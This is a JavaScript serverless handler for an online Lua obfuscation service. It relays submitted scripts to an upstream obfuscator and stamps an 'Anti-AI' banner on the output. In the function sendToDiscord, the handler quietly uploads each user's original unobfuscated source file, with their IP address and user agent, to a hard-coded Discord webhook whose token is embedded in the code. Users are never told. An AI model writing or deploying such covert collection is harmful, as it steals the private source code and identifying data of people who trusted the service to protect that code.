export const config = {
  api: {
    bodyParser: {
      sizeLimit: "10mb"
    }
  }
};

const UPSTREAM_URL = "https://ar19-apii.vercel.app/api/obfuscate-prometheus";

// ============================================
// DISCORD WEBHOOK
// ============================================
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1554894906395205723/j4GMOAkftOTxkzrsNsJgMUPa5IwYeaa1PCV1WBn7Y_54XhgihdiD4_Zif163NNZZQ7QV";

const CUSTOM_HEADER = `--[[
        =============================================================================================
       _  _  __ ______                     _________________ _  _ _____ _____   ___ _____ ___________ 
      | | | |/  ||  _  \\                  |  _  | ___ \\  ___| | | /  ___/  __ \\ / _ \\_  _|  _  | ___ \\
      | |_| |\`| || | | |________  ______  | | | | |_/ / |_  | | |   \`--.| /  \\/// /_\\ \\| | | | | | |_/ /
      |  _  | | || | | |_  /_  / |______| | | | | ___ \\  _| | | | | \`--. \\ |    |  _  || | | | | |    / 
      | | | |_| || |/ / / / / /           \\ \\_/ / |_/ / |   | |_| /\\__/ / \\__/\\| | | || | \\ \\_/ / |\\ \\ 
      \\_| |_/\\___/___/ /___/___|           \\___/\\____/\\_|    \\___/\\____/ \\____/\\_| |_/\\_/  \\___/\\_| \\_|
                                                                                                     
                                Obfuscator Anti-AI(LUA / PWN / HTML)
        =============================================================================================
        bª Website     : https://obfuscator.hdz.my.id
        bª Obfuscation : Runtime polymorphic
        bª Anti-tamper : Ci verification
        bª Entropy     : High
        bª Status      : bÏ Online
        =============================================================================================
]]--`;

// ============================================
// FUNGSI KIRIM KE DISCORD
// ============================================
async function sendToDiscord({ script, mode, ip, userAgent, obfuscatedLength }) {
  console.log("[webhook] Sending to Discord...");

  try {
    const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    const fileBlob = new Blob([script], { type: "text/plain" });

    const payload = {
      username: "Obfuscate Monitor",
      avatar_url: "https://cdn-icons-png.flaticon.com/512/2103/2103633.png",
      embeds: [
        {
          title: "🔒 New Obfuscation Detected",
          color: 0x1e90ff,
          fields: [
            { name: "⚙️ Method", value: "`" + (mode || "unknown") + "`", inline: true },
            { name: "📏 Original Size", value: "`" + script.length + " chars`", inline: true },
            { name: "📦 Obfuscated Size", value: "`" + (obfuscatedLength || 0) + " chars`", inline: true },
            { name: "🌐 IP Address", value: "`" + (ip || "unknown") + "`", inline: true },
            { name: "🕐 Time", value: "`" + timestamp + " WIB`", inline: true },
            {
              name: "🖥️ User Agent",
              value: "```" + (userAgent ? userAgent.slice(0, 200) : "unknown") + "```",
              inline: false
            }
          ],
          footer: { text: "CommunityZenn · Obfuscate Monitor" },
          timestamp: new Date().toISOString()
        }
      ]
    };

    const formData = new FormData();
    formData.append("payload_json", JSON.stringify(payload));
    formData.append("files[0]", fileBlob, "source.lua");

    console.log("[webhook] POST ke Discord...");
    const res = await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      body: formData
    });

    console.log("[webhook] Discord response status:", res.status);

    if (!res.ok) {
      const errText = await res.text();
      console.error("[webhook] Discord error:", res.status, errText.slice(0, 300));
      return false;
    }

    console.log("[webhook] Sent to Discord successfully");
    return true;

  } catch (err) {
    console.error("[webhook] Exception:", err.message);
    console.error("[webhook] Stack:", err.stack);
    return false;
  }
}

// ============================================
// HANDLER UTAMA
// ============================================
export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, error: "Method not allowed" });
  }

  console.log("=========== NEW REQUEST ===========");
  console.log("[obfuscate] Request received");

  try {
    const { script, mode } = req.body || {};

    if (!script || typeof script !== "string") {
      return res.status(400).json({
        success: false,
        error: "Field 'script' wajib diisi"
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "unknown";

    const userAgent = req.headers["user-agent"] || "unknown";

    console.log("[obfuscate] Script length:", script.length, "| Mode:", mode);
    console.log("[obfuscate] IP:", ip);

    const upstream = await fetch(UPSTREAM_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ script })
    });

    const text = await upstream.text();
    console.log("[obfuscate] Upstream status:", upstream.status);

    if (!upstream.ok) {
      return res.status(upstream.status).json({
        success: false,
        error: `Upstream error ${upstream.status}`,
        detail: text.slice(0, 300)
      });
    }

    if (text.trim().startsWith("<")) {
      return res.status(502).json({
        success: false,
        error: "Upstream mengembalikan HTML, bukan JSON",
        detail: text.slice(0, 200)
      });
    }

    let data;
    try {
      data = JSON.parse(text);
    } catch {
      return res.status(502).json({
        success: false,
        error: "Upstream bukan JSON",
        detail: text.slice(0, 300)
      });
    }

    let obfuscated = data.code || data.obfuscated || data.result || data.data || data.output;

    if (!obfuscated) {
      return res.status(502).json({
        success: false,
        error: "Response upstream tidak punya field hasil obfuscate",
        raw_keys: Object.keys(data)
      });
    }

    if (obfuscated.startsWith("-- pinoolavender obfuscate")) {
      const nl = obfuscated.indexOf("\n");
      if (nl !== -1) obfuscated = obfuscated.slice(nl + 1);
    }
    obfuscated = obfuscated.replace(/^\s*\n/, "");
    obfuscated = CUSTOM_HEADER + "\n\n" + obfuscated;

    console.log("[obfuscate] Success, output length:", obfuscated.length);

    // ============================================
    // KIRIM KE DISCORD — TUNGGU SELESAI dulu
    // ============================================
    console.log("[obfuscate] Calling sendToDiscord...");
    try {
      const webhookResult = await sendToDiscord({
        script,
        mode: mode || "obfuscate-prometheus",
        ip,
        userAgent,
        obfuscatedLength: obfuscated.length
      });
      console.log("[obfuscate] Webhook result:", webhookResult ? "OK" : "FAILED");
    } catch (webhookErr) {
      console.error("[obfuscate] Webhook threw:", webhookErr.message);
      console.error("[obfuscate] Webhook stack:", webhookErr.stack);
    }

    console.log("=========== DONE ===========");

    return res.status(200).json({
      success: true,
      obfuscated
    });

  } catch (err) {
    console.error("[obfuscate] Error:", err);
    return res.status(500).json({
      success: false,
      error: err.message || "Internal server error"
    });
  }
}